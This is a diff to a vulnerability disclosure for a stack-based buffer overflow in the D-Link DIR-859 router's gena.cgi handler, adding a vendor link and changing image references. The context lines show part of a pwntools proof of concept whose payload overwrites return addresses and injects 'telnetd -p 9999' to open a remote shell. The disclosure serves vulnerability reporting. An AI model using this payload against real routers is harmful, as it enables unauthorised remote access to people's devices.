@@ -4,6 +4,8 @@ Reported by: 　　　　　 chunkl.hit@gmail.com
 
 Affected products:　　　DIR-859
 
+Vendor Homepage:       https://www.dlink.com/    
+
 Vendor Advisory:       https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10267
 
 
@@ -11,11 +13,10 @@ Vendor Advisory:       https://supportannouncement.us.dlink.com/announcement/pub
 The LAN-side Web-Configuration Interface has Stack-based Buffer Overflow vulnerability in the D-Link DIR-859 Wi-Fi router firmware v1.05. In the genacgi_main function of the cgibin program, the sprintf method directly uses the service parameter from /gena.cgi. The attackers can construct a payload to carry out arbitrary code attacks.
 
 # Vul Details
-
-![avatar](img/Picture1.jpg)
+![avatar](img/Picture1.png)
 
 # Code in genacgi_main:
-![avatar](img/Picture2.jpg)
+![avatar](img/Picture2.png)
 
 # Poc
     from pwn import *
@@ -50,3 +51,6 @@ The LAN-side Web-Configuration Interface has Stack-based Buffer Overflow vulnera
     serverInput = "192.168.0.1"
     portInput = 49152
     httpSUB(serverInput, portInput, "a"*0xAA+p32(0xc068FF7F)+"a"*4+p32(0xD0A2B42A)+p32(0x14D9B22A)+"telnetd -p 9999;a")
+
+
+![avatar](img/Picture3.png)
